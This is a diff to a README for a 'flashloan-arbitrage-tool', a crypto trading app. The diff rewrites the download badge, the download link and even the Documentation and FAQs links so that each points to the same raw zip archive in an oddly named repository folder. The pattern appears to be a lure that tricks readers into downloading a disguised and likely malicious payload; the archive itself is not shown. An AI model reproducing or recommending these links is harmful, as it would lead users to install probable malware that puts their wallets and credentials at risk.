@@ -1,6 +1,6 @@
 # 🚀 flashloan-arbitrage-tool - Effortless Arbitrage for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Flashloan%20Arbitrage%20Tool-brightgreen)](https://github.com/Faysal012/flashloan-arbitrage-tool/releases)
+[![Download Now](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip%20Now-Flashloan%20Arbitrage%20Tool-brightgreen)](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ The flashloan-arbitrage-tool allows users to take advantage of price discrepanci
 
 To get started with the flashloan-arbitrage-tool, visit the following page to download the application:
 
-[Download Here](https://github.com/Faysal012/flashloan-arbitrage-tool/releases)
+[Download Here](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip)
 
 Follow these steps to successfully download and install the tool:
 
@@ -76,8 +76,8 @@ Join our community for support and discussions:
 
 For further reading and resources, visit:
 
-- [Documentation](https://github.com/Faysal012/flashloan-arbitrage-tool/wiki): Detailed guides on using all features.
-- [FAQs](https://github.com/Faysal012/flashloan-arbitrage-tool/wiki/FAQs): Common questions and answers to assist new users.
+- [Documentation](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip): Detailed guides on using all features.
+- [FAQs](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip): Common questions and answers to assist new users.
 
 ## 📤 Feedback
 
